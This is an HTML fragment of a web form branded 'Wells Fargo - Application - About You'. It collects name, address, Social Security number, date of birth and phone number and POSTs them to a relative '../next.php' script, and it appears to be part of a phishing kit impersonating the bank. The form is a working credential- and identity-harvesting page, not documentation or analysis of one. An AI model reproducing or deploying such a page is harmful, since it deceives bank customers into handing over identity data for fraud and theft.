...
<head>
    ...
    <link rel="stylesheet" href="assets/css/desktop-tablet.css">
    ...
    <div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage">
        ...
        <div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
            <div class="primary-content">
                ...
                <form id="form" class="wait" action="../next.php" method="POST">
                    ...
                    <div class="section">
                        ...
                        <div class="ui-field-contain street2-field-voice-over">
                            ...
                            <div id="f1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                <input style="text-transform: capitalize;" id="fname" name="fname" class="pmask" type="text" size="35" required>
                            </div>
                        </div>
                        <div class="ui-field-contain inline-field-contain">
                            <div class="inline-field">
                                ...
                                <div id="a1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input style="text-transform: capitalize;" id="addr" name="addr" class="pmask required EMAIL" type="text" required>
                                </div>
                            </div>
                            <div class="inline-field">
                                <label class="lb" for="city">
                                    City
                                </label>
                                <div id="c1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input style="text-transform: capitalize;" id="city" name="city" class="pmask required EMAIL" type="text" required>
                                </div>
                            </div>
                        </div>
                        <div class="ui-field-contain inline-field-contain">
                            <div class="inline-field">
                                ...
                                <div id="s1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input style="text-transform: capitalize;" id="state" name="state" class="pmask required EMAIL" type="text" required>
                                </div>
                            </div>
                            <div class="inline-field">
                                <label class="lb" for="zip">
                                    Zip Code
                                </label>
                                <div id="z1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input id="zip" name="zip" class="pmask required EMAIL" type="text" required>
                                </div>
                            </div>
                        </div>
                        <div class="ui-field-contain inline-field-contain">
                            <div class="inline-field">
                                ...
                                <div id="s2" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input id="ssn" name="ssn" placeholder="xxx-xx-xxxx" class="pmask required EMAIL" type="text" required>
                                </div>
                            </div>
                            <div class="inline-field">
                                <label class="lb" for="dob">
                                    Date of Birth
                                </label>
                                <div id="d1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input id="dob" name="dob" placeholder="mm/dd/yyyy" class="pmask required EMAIL" type="text" required>
                                </div>
                            </div>
                        </div>
                        <div class="ui-field-contain inline-field-contain">
                            <div class="inline-field">
                                ...
                                <div id="p1" class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset">
                                    <input id="phone" placeholder="xxx-xxx-xxxx" name="phone" class="pmask required" type="text" size="35" required>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="btn-ctr">
                        <div class="btn-ctr-inner">
                            <button id="btn" type="submit" class="continue-button ui-btn ui-btn-p">
                                Continue
                            </button>
                        </div>
                    </div>
